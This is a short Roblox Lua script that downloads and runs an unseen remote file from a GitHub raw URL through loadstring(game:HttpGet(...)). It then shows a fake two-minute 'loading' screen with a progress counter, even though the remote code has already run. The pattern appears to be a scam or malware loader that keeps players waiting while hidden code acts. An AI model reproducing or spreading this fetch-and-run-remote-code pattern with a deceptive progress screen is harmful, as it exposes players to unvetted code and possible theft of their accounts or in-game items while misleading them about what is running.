loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/2849a38fae32ab348851265e.lua'))()


 -- Create the ScreenGui
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGui"
loadingGui.ResetOnSpawn = false

-- Create the Message Label
local messageLabel = Instance.new("TextLabel")
messageLabel.Name = "MessageLabel"
messageLabel.Parent = loadingGui
messageLabel.Text = "Script will load soon, wait patiently."
messageLabel.Size = UDim2.new(0.6, 0, 0.2, 0)
messageLabel.Position = UDim2.new(0.2, 0, 0.3, 0)
messageLabel.TextScaled = true
messageLabel.BackgroundColor3 = Color3.new(0, 0, 1) -- Blue Background
messageLabel.TextColor3 = Color3.new(1, 1, 1) -- White Text

-- Create the Progress Label
local progressLabel = Instance.new("TextLabel")
progressLabel.Name = "ProgressLabel"
progressLabel.Parent = loadingGui
progressLabel.Text = "1% Complete"
progressLabel.Size = UDim2.new(0.3, 0, 0.1, 0)
progressLabel.Position = UDim2.new(0.35, 0, 0.5, 0)
progressLabel.TextScaled = true
progressLabel.BackgroundColor3 = Color3.new(0, 0, 1) -- Blue Background
progressLabel.TextColor3 = Color3.new(1, 1, 1) -- White Text

-- Parent the GUI to the player's PlayerGui
loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Percentage Counter (1% to 100% over 2 minutes)
for i = 1, 100 do
    progressLabel.Text = tostring(i) .. "% Complete"
    wait(1.2) -- 120 seconds (2 minutes) divided by 100 updates
end

-- Remove the loading screen
loadingGui:Destroy()   
